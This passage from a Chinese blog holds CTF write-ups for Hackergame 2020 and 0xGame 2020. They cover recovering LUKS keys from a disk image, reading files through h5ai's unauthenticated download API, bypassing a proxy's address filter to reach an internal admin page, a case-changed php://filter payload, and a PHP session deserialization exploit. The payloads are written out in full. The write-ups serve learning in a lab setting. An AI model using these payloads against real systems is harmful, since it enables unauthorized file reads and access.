83 Linux roommates_disk_part.img7 3893248 16775167 12881920 6.1G 83 Linux 可以看到有 swap 交换分区，以及不全的 Linux 分区？而且直接挂载也挂不上。 搜了一下 LUKS 加密相关的文章，找到了国外师傅的 WriteUp，参考： [Forensics] BsidesSF 2019 - goodluks2 [Forensics] BsidesSF 2019 - goodluks3 首先用 aeskeyfind 这个工具找一找 swap 分区里有没有残留的 AES Key。发现果然有，但是一堆。。 （本来应该先把这几个分区用 dd 之类工具分割一下的，但我懒了嘤嘤嘤 $ aeskeyfind roommates_disk_part.img e195501f5bf8fffe5f4c66c43249a5747875c98f9cb598c70f52a0d05f0601bc d913145b01b203ca068e48d2f40b048639d8c6f4cfe93b22c3795945ca9d9e2a 000102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f 457895c6ffa897807497bc31320cf9bff6707e176be26a1058fa49a12ccd2762 b895ea5154cea307a3f3891fd43f19c0d54ba38b8dd28519841fa818f24eaefb 082c4400a34b81dbc80de81874cf03ff16d97eb9380c515d3ec48e8433d7dc64 ef3b6d7b80e9ff8b13c8b801984d2c9cf6c0ca8dd342da98112f0c70f34fd5c8 4cdc0c14cb55bb435e75438b7d73f445ed5e90c9514b2d4264c753492bf847e8 9f3330a42a7f6446260df6e2f31d311e2fcfa3d6e1f4736e835b78e63c97ccc3 eab90394d3e9892c87a4b2f32144c71a2b1d2e0cdefce683125d695d6ed81d6c 37d7deb43c0223b8656dd6a862562a1a8360926278dc65f445eda2146844589f 000102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f 6bc77bd328b378315a193c7dfa0d14c2f023f5565564de40a6ba66d29aedfd3d 31c69dff83847a6c3c3c091e4ff6113ca5799e1b63656f0bd51bd6490c20769c e4d58f63d629f38803da3c712c5a0cc2be774b9d925d136024a181315d91ac99 136ce9ce0d3f130ebe629570a08bc2ea883e451533875140027d1b3fdb5d0091 31c69dff83847a6c3c3c091e4ff6113ca5799e1b63656f0bd51bd6490c20769c fa01a98089a38f606c148694e7a3509aaccfc165068ed67f5715384b93e56aa6 e4581675c3f947f7b537a3dd6098e4a5898b0a18c2b3b0f675c61de4106fc6a1 4c82f3493f9a3381f51c394ab8532bd037db64b793057aade3d6bf67cbebf933 fa01a98089a38f606c148694e7a3509aaccfc165068ed67f5715384b93e56aa6 e4581675c3f947f7b537a3dd6098e4a5898b0a18c2b3b0f675c61de4106fc6a1 Keyfind progress: 100% 或者用 findaes 这个工具。 $ ./findaes roommates_disk_part.img Searching roommates_disk_part.img Found AES-256 key schedule at offset 0xc3ffde4: e1 95 50 1f 5b f8 ff fe 5f 4c 66 c4 32 49 a5 74 78 75 c9 8f 9c b5 98 c7 0f 52 a0 d0 5f 06 01 bc Found AES-256 key schedule at offset 0xc6529d8: d9 13 14 5b 01 b2 03 ca 06 8e 48 d2 f4 0b 04 86 39 d8 c6 f4 cf e9 3b 22 c3 79 59 45 ca 9d 9e 2a Found AES-256 key schedule at offset 0xc652b08: 00 01 02 03 04 05 06 07 08 09 0a 0b 0c 0d 0e 0f 10 11 12 13 14 15 16 17 18 19 1a 1b 1c 1d 1e 1f Found AES-256 key schedule at offset 0xc652bfc: 45 78 95 c6 ff a8 97 80 74 97 bc 31 32 0c f9 bf f6 70 7e 17 6b e2 6a 10 58 fa 49 a1 2c cd 27 62 Found AES-256 key schedule at offset 0xc73bde4: b8 95 ea 51 54 ce a3 07 a3 f3 89 1f d4 3f 19 c0 d5 4b a3 8b 8d d2 85 19 84 1f a8 18 f2 4e ae fb Found AES-256 key schedule at offset 0xc7aade4: 08 2c 44 00 a3 4b 81 db c8 0d e8 18 74 cf 03 ff 16 d9 7e b9 38 0c 51 5d 3e c4 8e 84 33 d7 dc 64 Found AES-256 key schedule at offset 0xcbffde4: ef 3b 6d 7b 80 e9 ff 8b 13 c8 b8 01 98 4d 2c 9c f6 c0 ca 8d d3 42 da 98 11 2f 0c 70 f3 4f d5 c8 Found AES-256 key schedule at offset 0xfd13de4: 4c dc 0c 14 cb 55 bb 43 5e 75 43 8b 7d 73 f4 45 ed 5e 90 c9 51 4b 2d 42 64 c7 53 49 2b f8 47 e8 Found AES-256 key schedule at offset 0x101efde4: 9f 33 30 a4 2a 7f 64 46 26 0d f6 e2 f3 1d 31 1e 2f cf a3 d6 e1 f4 73 6e 83 5b 78 e6 3c 97 cc c3 Found AES-256 key schedule at offset 0x110d5de4: ea b9 03 94 d3 e9 89 2c 87 a4 b2 f3 21 44 c7 1a 2b 1d 2e 0c de fc e6 83 12 5d 69 5d 6e d8 1d 6c Found AES-256 key schedule at offset 0x1337c9d8: 37 d7 de b4 3c 02 23 b8 65 6d d6 a8 62 56 2a 1a 83 60 92 62 78 dc 65 f4 45 ed a2 14 68 44 58 9f Found AES-256 key schedule at offset 0x1337cb08: 00 01 02 03 04 05 06 07 08 09 0a 0b 0c 0d 0e 0f 10 11 12 13 14 15 16 17 18 19 1a 1b 1c 1d 1e 1f Found AES-256 key schedule at offset 0x1337cbfc: 6b c7 7b d3 28 b3 78 31 5a 19 3c 7d fa 0d 14 c2 f0 23 f5 56 55 64 de 40 a6 ba 66 d2 9a ed fd 3d Found AES-256 key schedule at offset 0x14e67de4: 31 c6 9d ff 83 84 7a 6c 3c 3c 09 1e 4f f6 11 3c a5 79 9e 1b 63 65 6f 0b d5 1b d6 49 0c 20 76 9c Found AES-256 key schedule at offset 0x1618ca1a: e4 d5 8f 63 d6 29 f3 88 03 da 3c 71 2c 5a 0c c2 be 77 4b 9d 92 5d 13 60 24 a1 81 31 5d 91 ac 99 Found AES-256 key schedule at offset 0x1618cc0e: 13 6c e9 ce 0d 3f 13 0e be 62 95 70 a0 8b c2 ea 88 3e 45 15 33 87 51 40 02 7d 1b 3f db 5d 00 91 Found AES-256 key schedule at offset 0x1632db50: 31 c6 9d ff 83 84 7a 6c 3c 3c 09 1e 4f f6 11 3c a5 79 9e 1b 63 65 6f 0b d5 1b d6 49 0c 20 76 9c Found AES-256 key schedule at offset 0x171c873a: fa 01 a9 80 89 a3 8f 60 6c 14 86 94 e7 a3 50 9a ac cf c1 65 06 8e d6 7f 57 15 38 4b 93 e5 6a a6 Found AES-256 key schedule at offset 0x171c890d: e4 58 16 75 c3 f9 47 f7 b5 37 a3 dd 60 98 e4 a5 89 8b 0a 18 c2 b3 b0 f6 75 c6 1d e4 10 6f c6 a1 Found AES-256 key schedule at offset 0x17d08b20: 4c 82 f3 49 3f 9a 33 81 f5 1c 39 4a b8 53 2b d0 37 db 64 b7 93 05 7a ad e3 d6 bf 67 cb eb f9 33 Found AES-256 key schedule at offset 0x19013349: fa 01 a9 80 89 a3 8f 60 6c 14 86 94 e7 a3 50 9a ac cf c1 65 06 8e d6 7f 57 15 38 4b 93 e5 6a a6 Found AES-256 key schedule at offset 0x1901351c: e4 58 16 75 c3 f9 47 f7 b5 37 a3 dd 60 98 e4 a5 89 8b 0a 18 c2 b3 b0 f6 75 c6 1d e4 10 6f c6 a1 用 losetup 将磁盘镜像文件虚拟成 loop 设备。 这里用第三个分区，起始的偏移为 1892352 * 512 = 968884224 bytes。 循环设备可把文件虚拟成区块设备，籍以模拟整个文件系统，让用户得以将其视为硬盘驱动器，光驱或软驱等设备，并挂入当作目录来使用。 sudo losetup --offset 968884224 /dev/loop30 roommates_disk_part.img 然后可以用 ls /dev/loop* 看到有 loop30 了。 随意把一行的 AES Key 拿去解密，发现也是提示 Cannot read 64 bytes from keyfile key0. 题目提示 AES512，这里解密出来的 AES256 密钥长度不够。于是就得把两个拼一起拿去解密，而且理论上应该是两个连续的密钥拼一起。 然而我就卡这里了。只想到正着拼接，没想到反过来连接。。 参考官方 WP 给的 Breaking Full Disk Encryption from a Memory Dump 一文，由于用的是小端序，这里应该反过来拼接。 试了半天发现是最后两条，而且还出现了两次。 echo 'e4581675c3f947f7b537a3dd6098e4a5898b0a18c2b3b0f675c61de4106fc6a1fa01a98089a38f606c148694e7a3509aaccfc165068ed67f5715384b93e56aa6' | xxd -r -p &gt; key0 然后用 key0 去解密镜像。 sudo cryptsetup luksOpen --master-key-file key0 /dev/loop30 decrypted 没有报错，然后再把这个 loop 给挂载上。最后进去拿到 flag。 sudo mkdir /mnt/hackergame sudo mount /dev/mapper/decrypted /mnt/hackergame cd /mnt/hackergame/ # ... cat flag.txt 最后再取消挂载，卸载 loop 设备。有始有终嘛。 sudo umount /mnt/hackergame sudo losetup -d /dev/loop30 sudo rm -rf /mnt/hackergame 其他 References &amp; Extensive Reading： Forensics CTF challenge - FBiOS writeup Hack.lu CTF 2015 - Forensics 150: Dr. Bob Writeup（较简单） AES – Symmetric Ciphers Online 一个在线的 AES 解密网站 迅雷网心云x86版虚拟机硬盘解密 超简易的网盘服务器 登录了服务器后台的小 C 开始思考技术方案：“听说 h5ai 搭建云盘的方案是不错的 … 使用 Basic Auth 可以做访问控制，可以保护根目录下的文件不被非法的访问 … 等等，有一些文件是可以被分享的，需要一个 /Public 目录来共享文件！” 三分钟后，小 C 同学完成了网盘的搭建。他想：“空着总不好，先得在云盘上放点东西！”。犹豫片刻，他掏出了自己珍藏了三个月的 flag 并上传到了云盘的根目录。 这题老馋了，做了好久才整出来，还是太菜了，我自己爬。 访问 /Public 目录，可以得到 nginx.conf 以及 Dockerfile。 关键代码： FROM alpine:latest EXPOSE 10120 WORKDIR /var/www/html RUN sed -i 's/dl-cdn.alpinelinux.org/mirrors.aliyun.com/g' /etc/apk/repositories \\ &amp;&amp; apk add nginx supervisor php7-fpm php7-session php7-json php7-gd php7-exif git wget unzip zip\\ &amp;&amp; mkdir -p /var/www/html/Public \\ &amp;&amp; wget https://release.larsjung.de/h5ai/h5ai-0.29.2.zip \\ &amp;&amp; unzip h5ai-0.29.2.zip \\ &amp;&amp; cp -rp /var/www/html/_h5ai /var/www/html/Public/_h5ai \\ &amp;&amp; rm h5ai-0.29.2.zip \\ &amp;&amp; mkdir /run/nginx ADD ./supervisord.conf /etc/supervisor/conf.d/supervisord.conf ADD ./nginx.conf /etc/nginx/nginx.conf ADD ./php.ini /etc/php7/php.ini RUN rm /etc/nginx/conf.d/default.conf RUN chown -R nobody.nobody /var/www/html &amp;&amp; \\ chown -R nobody.nobody /run &amp;&amp; \\ chown -R nobody.nobody /var/lib/nginx &amp;&amp; \\ chown -R nobody.nobody /var/log/nginx &amp;&amp; \\ chown -R nobody.nobody /var/log/php7 USER nobody ADD --chown=nobody ./flag.txt /var/www/html/ ADD --chown=nobody ./dockerfile ./nginx.conf /var/www/html/Public/ CMD [\"/usr/bin/supervisord\", \"-c\", \"/etc/supervisor/conf.d/supervisord.conf\"] cp -rp /var/www/html/_h5ai /var/www/html/Public/_h5ai，这里看得出来**有两个 _h5ai**，实际访问也是。 server{ # Docker 内部的地址，无关紧要 listen 10120; server_name _; root /var/www/html; index index.php index.html /_h5ai/public/index.php; # _h5ai/private 文件夹下的内容是不可直接访问的，设置屏蔽 location ~ _h5ai/private { deny all; } # 根目录是私有目录，使用 basic auth 进行认证，只有我（超极致的小 C)自己可以访问 location / { auth_basic \"easy h5ai. For visitors, please refer to public directory at `/Public!`\"; auth_basic_user_file /etc/nginx/conf.d/htpasswd; } # Public 目录是公开的，任何人都可以访问，便于我给大家分享文件 location /Public { allow all; index /Public/_h5ai/public/index.php; } # PHP 的 fastcgi 配置，将请求转发给 php-fpm location ~ \\.php$ { fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; include fastcgi_params; } location ~ /\\. { log_not_found off; deny all; } } （提一句，这个密钥文件说不好还不存在（x （本地搭建就是这样，但不影响题目。 刚开始还以为是 Nginx 配置问题，可能路径穿越，例如 /Public../，但不知道跑哪去了 本地搭建试了试，的确路由到 /Public../ 目录下了，但不知道为啥列不出文件，文件下载倒是可以的。 可能是需要设置 alias，开启 autoindex，才会有这个漏洞吧。 再想想，难道是 php-fpm在nginx特定环境下的任意代码执行漏洞（CVE-2019-11043）？（GitHub **phuip-fpizdam**） 看了下也不是。 不行了不行了，感觉不是 nginx 的问题，得审计源码了。 根据 Nginx 配置，访问这个 http://202.38.93.111:10120/Public/_h5ai/public/index.php ，发现密码为空，有一些相关的信息。 把源码下载下来，这个index.php调用了 class-bootstrap.php。 require_once __DIR__ . '/../private/php/class-bootstrap.php'; Bootstrap::run(); class-bootstrap.php 里判断请求来源，判断是 api/info/else？ public static function run() { spl_autoload_register(['Bootstrap', 'autoload']); putenv('LANG=en_US.UTF-8'); setlocale(LC_CTYPE, 'en_US.UTF-8'); date_default_timezone_set(@date_default_timezone_get()); session_start(); $session = new Session($_SESSION); $request = new Request($_REQUEST, file_get_contents('php://input')); $setup = new Setup($request-&gt;query_boolean('refresh', false)); $context = new Context($session, $request, $setup); if ($context-&gt;is_api_request()) { (new Api($context))-&gt;apply(); } elseif ($context-&gt;is_info_request()) { $public_href = $setup-&gt;get('PUBLIC_HREF'); $x_head_tags = $context-&gt;get_x_head_html(); $fallback_mode = false; require __DIR__ . '/pages/info.php'; } else { $public_href = $setup-&gt;get('PUBLIC_HREF'); $x_head_tags = $context-&gt;get_x_head_html(); $fallback_mode = $context-&gt;is_fallback_mode(); $fallback_html = (new Fallback($context))-&gt;get_html(); require __DIR__ . '/pages/index.php'; } } class-context.php: public function is_api_request() { return strtolower($this-&gt;setup-&gt;get('REQUEST_METHOD')) === 'post'; } 于是只要发个 POST 请求就能调用 API. 试试发现缺参数。 看调用： (new Api($context))-&gt;apply(); class-api.php: public function apply() { $action = $this-&gt;request-&gt;query('action'); $supported = ['download', 'get', 'login', 'logout']; Util::json_fail(Util::ERR_UNSUPPORTED, 'unsupported action', !in_array($action, $supported)); $methodname = 'on_' . $action; $this-&gt;$methodname(); } private function on_download() { Util::json_fail(Util::ERR_DISABLED, 'download disabled', !$this-&gt;context-&gt;query_option('download.enabled', false)); $as = $this-&gt;request-&gt;query('as'); $type = $this-&gt;request-&gt;query('type'); $base_href = $this-&gt;request-&gt;query('baseHref'); $hrefs = $this-&gt;request-&gt;query('hrefs', ''); $archive = new Archive($this-&gt;context); set_time_limit(0); header('Content-Type: application/octet-stream'); header('Content-Disposition: attachment; filename=\"' . $as . '\"'); header('Connection: close'); $ok = $archive-&gt;output($type, $base_href, $hrefs); Util::json_fail(Util::ERR_FAILED, 'packaging failed', !$ok); exit; } 我这里用了 download 方法，按照代码依次补上参数就完事了。 class-archive.php: public function output($type, $base_href, $hrefs) { $this-&gt;base_path = $this-&gt;context-&gt;to_path($base_href); if (!$this-&gt;context-&gt;is_managed_path($this-&gt;base_path)) { return false; } $this-&gt;dirs = []; $this-&gt;files = []; $this-&gt;add_hrefs($hrefs); if (count($this-&gt;dirs) === 0 &amp;&amp; count($this-&gt;files) === 0) { if ($type === 'php-tar') { $this-&gt;add_dir($this-&gt;base_path, '/'); } else { $this-&gt;add_dir($this-&gt;base_path, '.'); } } if ($type === 'php-tar') { return $this-&gt;php_tar($this-&gt;dirs, $this-&gt;files); } elseif ($type === 'shell-tar') { return $this-&gt;shell_cmd(Archive::$TAR_PASSTHRU_CMD); } elseif ($type === 'shell-zip') { return $this-&gt;shell_cmd(Archive::$ZIP_PASSTHRU_CMD); } return false; } 这里就用 shell-zip 好了，其实都行。 于是这题其实就是 h5ai 自带的 API 造成的文件读取，主要这个接口没有鉴权，更主要的是 Dockerfile 里用的是 cp 复制而不是 mv 移动。 噢对了，要用根目录的那个 _h5ai. （发现根目录访问 .php 会直接丢给 fastcgi 处理了，也就绕过了 Basic Auth。 Payload: POST http://202.38.93.111:10120/_h5ai/public/index.php?action=download&amp;as=flag&amp;type=shell-zip&amp;baseHref=/ （hrefs 参数发现不需要也行。 保存响应，然后解压就得到 flag.txt 了。 flag{super_secure_cloud} BTW, 有大佬发现这里的hrefs 参数没有检查 \\\\.., ..\\\\ 等，可以构造路径 /Public\\\\..\\\\flag.txt，此时经过 normalize 后 /Public/../，从而路径穿越实现任意文件读取。 详见 cytvictor 师傅的 WriteUp h5ai#758: A potential security issue of unauthorized access 以及 h5ai#760: Unchecked l10n input leads to arbitrary JSON file reads （算是 0day 漏洞了吧 超安全的代理服务器（复现） 在 2039 年，爆发了一场史无前例的疫情。为了便于在各地的同学访问某知名大学「裤子大」的网站进行「每日健康打卡」，小 C 同学为大家提供了这样一个代理服务。曾经信息安全专业出身的小 C 决定把这个代理设计成最安全的代理。 提示：浏览器可能会提示该 TLS 证书无效，与本题解法无关，信任即可。 公告：题目帮助页面（https://146.56.228.227/help）右下角的「管理中心」链接有误，应该与首页相同，都是指向 http://127.0.0.1:8080/ 找到 Secret 这题用了 HTTP2 的 Server PUSH。 具体可以参考一下 Wikipedia: HTTP/2 Server Push 以及 阮一峰的HTTP/2 服务器推送（Server Push）教程。 通常用到 Server Push 的话都是把 CSS、JS 之类的资源顺便推送给用户，然而这一题换了几个浏览器都没见到推送了啥资源…… 甚至用 Postman（貌似不支持 HTTP2?） / Burp Suite（手动改请求头）降级到 HTTP/1.0 或者 HTTP/1.1，就不让你用。 而 cURL 都直接不让你用。把 headers 都加上了，也不知道他怎么判断到的。。 curl \"https://146.56.228.227/\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0\" -H \"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\" -H \"Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\" --compressed -H \"Connection: keep-alive\" -H \"Upgrade-Insecure-Requests: 1\" -H \"Pragma: no-cache\" -H \"Cache-Control: no-cache\" -H \"TE: Trailers\" -k -vv --http2 但是这个信息肯定是在网络流里传输的，Wireshark 抓包的话肯定能抓到。 但是这里用到了 tls 加密，直接抓是抓不到明文的，然而我做这题的时候没配好还是没抓到明文（大草。 首先需要在系统设置一个 SSLKEYLOGFILE 环境变量，变量值为你喜欢的路径下建的一个用来保存 log 的文件。 而后在 wireshark 里设置文件路径。 再打开浏览器访问题目，就能在 wireshark 里抓到明文包了。 追踪 TLS 流 / HTTP2 stream 就能看到这个推送的 secret 和 flag1 了。 ⚠ 抓包完成后请及时删除此环境变量，防止信息泄露。 这个题看到官方WP 给了基于 nghttp2 的解法。 nghttp -v https://146.56.228.227/ 入侵管理中心网页上的 管理中心 URL 为 http://127.0.0.1:8080/ ，访问 http://146.56.228.227:8080/ 提示 管理中心无法从公网直接访问 根据 帮助 给出的提示，需要利用 CONNECT 协议。 根据 RFC 7231 中的相关内容，结合题目所需的secret，请求头格式如下。 CONNECT server.example.com:80 HTTP/1.1 Host: server.example.com:80 Secret: xxxxxxxx 再看过滤的列表 全球单播地址 10.0.0.0/8 127.0.0.0/8 172.16.0.0/12 192.168.0.0/16 其中不包括 IPv6 地址，可以试试本地环回，即[::1]。 构造请求发过去试试，发现成功建立连接。 The recipient proxy can establish a tunnel either by directly connecting to the request-target or, if configured to use another proxy, by forwarding the CONNECT request to the next inbound proxy. Any 2xx (Successful) response indicates that the sender (and all inbound proxies) will switch to tunnel mode immediately after the blank line that concludes the successful response’s header section; data received after that blank line is from the server identified by the request-target. Any response other than a successful response indicates that the tunnel has not yet been formed and that the connection remains governed by HTTP. A tunnel is closed when a tunnel intermediary detects that either side has closed its connection: the intermediary MUST attempt to send any outstanding data that came from the closed side to the other side, close both connections, and then discard any remaining data left undelivered. 说明隧道已经建立了，但貌似做不到马上发下一个请求，于是隧道就关闭了。 用 Burp Suite 发包这个方案不实在（（ 好烦啊喵，用 curl 好了吧。（参考了官方 WP） 需要带上 Referer，否则会提示 管理中心需要从 ‘146.56.228.227’ 被访问(Referer) $ curl -x https://146.56.228.227:443 --proxy-insecure -vvnn -p --proxy-header \"Secret: aa08235651\" http://[::1]:8080 -H \"Referer: 146.56.228.227\" * Rebuilt URL to: http://[::1]:8080/ * Couldn't find host ::1 in the .netrc file; using defaults * Trying 146.56.228.227... * TCP_NODELAY set * Connected to 146.56.228.227 (146.56.228.227) port 443 (#0) * successfully set certificate verify locations: * CAfile: /etc/ssl/certs/ca-certificates.crt CApath: /etc/ssl/certs * TLSv1.3 (OUT), TLS handshake, Client hello (1): * TLSv1.3 (IN), TLS handshake, Server hello (2): * TLSv1.3 (IN), TLS Unknown, Certificate Status (22): * TLSv1.3 (IN), TLS handshake, Unknown (8): * TLSv1.3 (IN), TLS Unknown, Certificate Status (22): * TLSv1.3 (IN), TLS handshake, Certificate (11): * TLSv1.3 (IN), TLS Unknown, Certificate Status (22): * TLSv1.3 (IN), TLS handshake, CERT verify (15): * TLSv1.3 (IN), TLS Unknown, Certificate Status (22): * TLSv1.3 (IN), TLS handshake, Finished (20): * TLSv1.3 (OUT), TLS change cipher, Client hello (1): * TLSv1.3 (OUT), TLS Unknown, Certificate Status (22): * TLSv1.3 (OUT), TLS handshake, Finished (20): * SSL connection using TLSv1.3 / TLS_AES_128_GCM_SHA256 * Proxy certificate: * subject: O=mkcert development certificate; OU=root@hg20-debian * start date: Jun 1 00:00:00 2019 GMT * expire date: Oct 23 01:13:11 2030 GMT * issuer: O=mkcert development CA; OU=root@hg20-debian; CN=mkcert root@hg20-debian * SSL certificate verify result: unable to get local issuer certificate (20), continuing anyway. * allocate connect buffer! * Establish HTTP proxy tunnel to ::1:8080 * TLSv1.3 (OUT), TLS Unknown, Unknown (23): &gt; CONNECT [::1]:8080 HTTP/1.1 &gt; Host: [::1]:8080 &gt; User-Agent: curl/7.58.0 &gt; Proxy-Connection: Keep-Alive &gt; Secret: aa08235651 &gt; * TLSv1.3 (IN), TLS Unknown, Certificate Status (22): * TLSv1.3 (IN), TLS handshake, Newsession Ticket (4): * TLSv1.3 (IN), TLS Unknown, Unknown (23): &lt; HTTP/1.1 200 OK * TLSv1.3 (IN), TLS Unknown, Unknown (23): &lt; Content-Length: 0 * Ignoring Content-Length in CONNECT 200 response * TLSv1.3 (IN), TLS Unknown, Unknown (23): &lt; * Proxy replied 200 to CONNECT request * CONNECT phase completed! * CONNECT phase completed! * CONNECT phase completed! * TLSv1.3 (OUT), TLS Unknown, Unknown (23): &gt; GET / HTTP/1.1 &gt; Host: [::1]:8080 &gt; User-Agent: curl/7.58.0 &gt; Accept: */* &gt; Referer: 146.56.228.227 &gt; * TLSv1.3 (IN), TLS Unknown, Unknown (23): &lt; HTTP/1.1 200 OK &lt; Date: Sat, 07 Nov 2020 15:59:36 GMT &lt; Content-Length: 32 &lt; Content-Type: text/plain; charset=utf-8 &lt; * Connection #0 to host 146.56.228.227 left intact flag2: flag{c0me_1n_t4_my_h0use} 另外看到 imlonghao 师傅的命令大法。（原来的代码在我这 Ubuntu 报错，于是改了一下反引号执行） curl -v -k --proxy https://146.56.228.227/ --proxy-insecure --proxy-header \"Secret: `(nghttp https://146.56.228.227/ 2&gt;/dev/null | grep secret: | awk '{print $4}')`\" http://www.ustc.edu.cn.127.0.0.1.nip.io:8080/ -p -H \"Referer: https://146.56.228.227\" BTW， www.ustc.edu.cn.127.0.0.1.nip.io 这个域名会解析到 127.0.0.1，详见 https://nip.io 任意 IP DNS 泛域名。 不经意传输from Crypto.PublicKey import RSA from random import SystemRandom import os if __name__ == \"__main__\": random = SystemRandom() key = RSA.generate(1024) print(\"n =\", key.n) print(\"e =\", key.e) m0 = int.from_bytes(os.urandom(64).hex().encode(), \"big\") m1 = int.from_bytes(os.urandom(64).hex().encode(), \"big\") x0 = random.randrange(key.n) x1 = random.randrange(key.n) print(\"x0 =\", x0) print(\"x1 =\", x1) v = int(input(\"v = \")) m0_ = (m0 + pow(v - x0, key.d, key.n)) % key.n m1_ = (m1 + pow(v - x1, key.d, key.n)) % key.n print(\"m0_ =\", m0_) print(\"m1_ =\", m1_) guess0 = int(input(\"m0 = \")) guess1 = int(input(\"m1 = \")) if guess0 == m0: print(open(\"flag1\").read()) if guess1 == m1: print(open(\"flag2\").read()) else: print(\"Nope\") 解密消息直接令 v = x0，这样直接就 m0_ = m0 了，得到 flag1. 小结总而言之，这次 Hackergame 题目很有梯度，很有脑洞，感觉不错，学到了许多，下次还来。 排名的话不停弹跳，好不容易做出道题目上去了，而后掉下来，到了最高的记录也就总榜 rk31 了，最后还是不停往下掉，最后都到总榜 rk41了，233. rk31 顺便留个纪念👇 大师傅们太强了！ 喵呜，还是太菜了啊，我自己爬（ 感觉这篇可以说是最长一篇博客了唉 （先这样吧 写不动了 （溜了溜了喵","path":"2020/11/08/CTF_2020Hackergame/"},{"title":"CTF | 2020 0xGame Web&Misc 部分WriteUp","text":"前言南邮的师傅们整了个 0xGame，比赛持续了一个月，每周放出一定的题目。 大概看了看，题目还是有点意思的。 比赛平台：http://game.0xctf.com/ 往期赛题环境：https://shimo.im/docs/8hkRHdRDdWyKycyK 主要顺便总结了一下 PHP SESSION 序列化引擎不同带来的反序列化漏洞吧。 （由于比较懒就没怎么写 WP，写的也比较简略 嘤嘤嘤（跑 Week 4Web_switch 小明在使用vim时电脑死机了，但是他写的代码还没有保存，这可怎么办呢？ http://web.game.0xctf.com:30103/ 访问显示 Do you know vim in Linux? 想到应该是 vim 的缓存文件吧。 即 .index.php.swp 下载以后用 vim 加载 vim -r .index.php.swp 而后 :wq 保存得到源码。 &lt;?php error_reporting(0);//flag in flag.php $id = $_POST['id']?$_POST['id']:0; $file = $_POST['file']?$_POST['file']:\"\"; if($id == '2'){ die(\"no no no !\"); } switch ($id) { case 0: die('&lt;h1 align=\"center\"&gt;&lt;font color=\"red\"&gt;Do you know vim in Linux?&lt;/font&gt;&lt;/h1&gt;'); case 1: die(\"0xGame Good!\"); case 2: if(preg_match('/filter|base64/', $file)){ die(\"hacker\"); } include($file); } POST 接收两个参数，id 的话在 switch 里会被强制类型转换，只需要输入第一个字符为 2 即可。 file 的话用 PHP 伪协议去读取。 虽然过滤了filter|base64，但匹配时没有不区分大小写，而 PHP 对大小写不敏感，于是改个大小写就完事了。 payload: id=2sdf&amp;file=php://filTer/read=convert.basE64-encode/resource=flag.php 得到 PD9waHANCiRmbGFnPScweEdhbWV7UzBtZV9wSHBfdFIxY0tzX3VfRzN0XzF0fSc7 base64decode &lt;?php $flag='0xGame{S0me_pHp_tR1cKs_u_G3t_1t}'; get! Web_broken_motto motto为啥查看不了了啊？ Hint：注意查看注释的地方，注释前后有什么区别 题目地址 现学现卖的一题，顺便来总结了一下相关的知识点，PHP 太奇妙了真的。 先源码审计。 register.php: &lt;?php require_once 'class.php'; session_save_path('session'); ini_set('session.serialize_handler','php_serialize'); session_start(); if(isset($_POST['username'])&amp;&amp;isset($_POST['password'])){ $user = new User($_POST['username'], $_POST['password'], $_POST['motto']); $user-&gt;register(); echo 'register success!'.\"&lt;br/&gt;\"; echo '&lt;a href=\"profile.php\"&gt;click hear to see your motto&lt;/a&gt;'; }else{ die('empty username or password!'); } ?&gt; profile.php: &lt;?php require_once 'class.php'; //ini_set('session.serialize_handler','php_serialize'); session_save_path('session'); session_start(); if(isset($_SESSION['username'])){ $info = new info(); }else{ die('出错啦！读取不到你的格言QWQ'); } class.php: &lt;?php class User { public $username; public $password; public $motto; function __construct($username, $password, $motto) { $this-&gt;username = $username; $this-&gt;password = $password; $this-&gt;motto = $motto; } public function register(){ $_SESSION['username'] = $this-&gt;username; $_SESSION['password'] = $this-&gt;password; $_SESSION['motto'] = $this-&gt;motto; } } class info{ public $admin; public $username; public $motto; public function __construct() { $this-&gt;admin = 0; $this-&gt;motto = $_SESSION['motto']; $this-&gt;username = $_SESSION['username']; } public function __destruct() { echo 'your motto:'.$this-&gt;motto; if($this-&gt;admin===1){ show_source('flag.php'); } } } 我们需要让 $this-&gt;admin=1，从而显示 flag。 PHP 在反序列化存储的 $_SESSION 数据时使用的引擎和序列化使用的引擎不一样，从而引入了漏洞。 PHP 里有三种序列化引擎，其中默认使用的是 php 引擎。 php_binary: 存储方式是，键名的长度对应的 ASCII 字符+键名+经过 serialize() 函数序列化处理的值 php: 存储方式是，键名+竖线+经过 serialize() 函数序列处理的值 php_serialize (php&gt;5.5.4): 存储方式是，经过 serialize() 函数序列化处理的值 PHP 里的 SESSION 是保存在文件里的，文件名格式为 sess_PHPSESSID，例如： 根据 hint，profile 里的应该用的是默认的 php 序列化引擎，而 register 里用的是 php_serialize。 profile 里需要 isset($_SESSION['username']) 才能进入，而这个 session 是在注册时 User 类里设置的， 即 $_SESSION['username'] = $this-&gt;username;。 访问 profile 时执行 session_start(); 语句时从文件中读取 session，将其反序列化。 那么我们先构造一个序列化好的对象，编写一段 php 代码来得到。 &lt;?php class info{ public $admin; public $username; public $motto; public function __construct() { $this-&gt;admin = 1; $this-&gt;motto = \"adfs\"; $this-&gt;username = \"admin\"; } } $x=new info(); echo serialize($x); 得到序列化后的为： O:4:\"info\":3:{s:5:\"admin\";i:1;s:8:\"username\";s:5:\"admin\";s:5:\"motto\";s:4:\"adfs\";} 在最前面加上 |，放到username里。 register 里使用 php_serialize 执行 $_SESSION['username'] = $this-&gt;username; 语句时，session 文件中存储的内容为 a:1:{s:8:\"username\";s:82:\"|O:4:\"info\":3:{s:5:\"admin\";i:1;s:8:\"username\";s:5:\"admin\";s:5:\"motto\";s:4:\"adfs\";}\";} 而 profile 在 session_start(); 执行读取时将这个文件里的内容进行反序列化。 将 | 之前的内容作为 SESSION 的 key，之后的内容作为 value，拿去 unserialize。 即 key 为 a:1:{s:8:\"username\";s:82:\"， value 为 O:4:\"info\":3:{s:5:\"admin\";i:1;s:8:\"username\";s:5:\"admin\";s:5:\"motto\";s:4:\"adfs\";}\";}。 于是在访问 profile 页面时，会反序列化伪造的数据，实例化 info 对象，最后就会把 admin 置为1了。 先本地试试，构造 payload 如下。 